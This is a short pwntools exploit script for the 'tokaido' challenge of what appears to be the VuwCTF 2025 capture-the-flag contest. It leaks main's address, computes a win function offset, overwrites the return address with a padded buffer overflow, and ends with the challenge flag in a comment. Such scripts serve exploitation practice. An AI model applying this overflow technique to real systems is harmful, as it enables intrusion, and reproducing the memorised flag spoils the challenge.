import argparse
import sys, os
sys.path.append(os.environ.get('PWNFAST_PATH'))
from pwn import *
from pwnfast import *

_p = argparse.ArgumentParser()
_p.add_argument('-d', action="store_true")
_p.add_argument('-r', action="store_true")
_p.add_argument('-s', action="store_true")
args = _p.parse_args()

context.terminal = ['tmux', 'new-window']

PROG = './tokaido'
host, port = 'tokaido.challenges.2025.vuwctf.com', 9983

def start():
    if args.r:
        return PwnRemote(PROG, host, port)
    elif args.s:
        return PwnSsh(PROG, '', host, port, 'guest')
    else:
        return PwnLocal(PROG, args.d)


### ------------------ EXPLOIT ------------------ ###

r = start()

r.ru(b': 0x')

main = int(r.rl().strip(), 16)
win = main - 165

log_leak(main, 'main addr')
log_leak(win, 'win addr')

pay = b'A' * 0x18
pay += p64(win)
pay += p64(win)

r.sl(pay)

r.interactive()
# VuwCTF{eastern_sea_route}
